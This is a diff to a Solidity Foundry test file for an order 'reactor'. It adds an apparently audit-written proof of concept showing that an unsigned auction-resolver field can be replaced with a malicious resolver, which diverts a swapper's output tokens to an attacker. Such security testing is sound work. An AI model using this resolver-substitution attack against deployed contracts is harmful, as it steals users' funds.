@@ -19,13 +19,14 @@ import {MockFeeController} from "../v4/util/mock/MockFeeController.sol";
 import {MockPreExecutionHook} from "../v4/util/mock/MockPreExecutionHook.sol";
 import {MockPostExecutionHook} from "../v4/util/mock/MockPostExecutionHook.sol";
 import {TokenTransferHook} from "../../src/v4/hooks/TokenTransferHook.sol";
-import {MockAuctionResolver} from "./util/mock/MockAuctionResolver.sol";
+import {MockAuctionResolver, MaliciousAuctionResolver} from "./util/mock/MockAuctionResolver.sol";
 import {MockOrder, MockOrderLib} from "./util/mock/MockOrderLib.sol";
 import {ArrayBuilder} from "../util/ArrayBuilder.sol";
 import {NATIVE} from "../../src/lib/CurrencyLibrary.sol";
 import {ERC20ETH} from "../../lib/calibur/lib/erc20-eth/src/ERC20Eth.sol";
 import {DelegationHandler} from "../native-input/DelegationHandler.sol";
 import {ERC20} from "solmate/src/tokens/ERC20.sol";
+import "forge-std/console2.sol";
 
 contract ReactorTest is ReactorEvents, Test, PermitSignature, DeployPermit2, DelegationHandler {
     using OrderInfoBuilder for OrderInfo;
@@ -138,6 +139,60 @@ contract ReactorTest is ReactorEvents, Test, PermitSignature, DeployPermit2, Del
         swapperOutputBalance = tokenOut.balanceOf(swapper);
         fillContractOutputBalance = tokenOut.balanceOf(address(fillContract));
     }
+    /// @dev Create a signed order for Reactor using MockOrder
+    function exploitSignedOrder(SignedOrder memory signedOrder, address maliciousResolver)
+        public
+        view
+        returns (SignedOrder memory modifiedOrder)
+    {
+        modifiedOrder.sig = signedOrder.sig;
+        (address auctResolver, bytes memory orderData) = abi.decode(signedOrder.order, (address, bytes));
+        console2.log("exploitSignedOrder - Original auction resolver:", auctResolver);
+        modifiedOrder.order = abi.encode(maliciousResolver, orderData);
+    }
+
+    /// @dev Test of a simple execute
+    function test_exploitExecuteStealFundsFromSwapper() public {
+        uint256 inputAmount = 1 ether;
+        uint256 outputAmount = 1 ether;
+        uint256 deadline = block.timestamp + 1000;
+        address attacker = address(0xA11A);
+
+        tokenIn.mint(address(swapper), inputAmount);
+        tokenOut.mint(address(fillContract), outputAmount);
+        tokenIn.forceApprove(swapper, address(permit2), inputAmount);
+
+        MockOrder memory order = createBasicOrder(inputAmount, outputAmount, deadline);
+
+        (SignedOrder memory signedOrder, bytes32 orderHash) = createAndSignOrder(order);
+
+        // Exploit: use malicious resolver instead of expected one, without modifying the signature
+        assertEq(tokenOut.balanceOf(address(attacker)), 0);
+        vm.startPrank(attacker);
+        MaliciousAuctionResolver maliciousResolver = new MaliciousAuctionResolver();
+        (SignedOrder memory modifiedOrder) = exploitSignedOrder(signedOrder, address(maliciousResolver));
+        vm.stopPrank();
+
+        (
+            uint256 swapperInputBalanceStart,
+            uint256 fillContractInputBalanceStart,
+            uint256 swapperOutputBalanceStart,
+            uint256 fillContractOutputBalanceStart
+        ) = _checkpointBalances();
+
+        vm.expectEmit(true, true, true, true, address(reactor));
+        emit Fill(orderHash, address(fillContract), swapper, order.info.nonce);
+        fillContract.execute(modifiedOrder);
+        vm.snapshotGasLastCall("ReactorExecuteSingle");
+
+        // @audit attacker received the output tokens
+        assertEq(tokenOut.balanceOf(address(attacker)), outputAmount);
+        assertEq(tokenIn.balanceOf(address(swapper)), swapperInputBalanceStart - inputAmount);
+        assertEq(tokenIn.balanceOf(address(fillContract)), fillContractInputBalanceStart + inputAmount);
+        assertEq(tokenOut.balanceOf(address(swapper)), swapperOutputBalanceStart); // @audit no output received by swapper
+        assertEq(tokenOut.balanceOf(address(fillContract)), fillContractOutputBalanceStart - outputAmount);
+    }
+
 
     /// @dev Test of a simple execute
     function test_executeBaseCase() public {
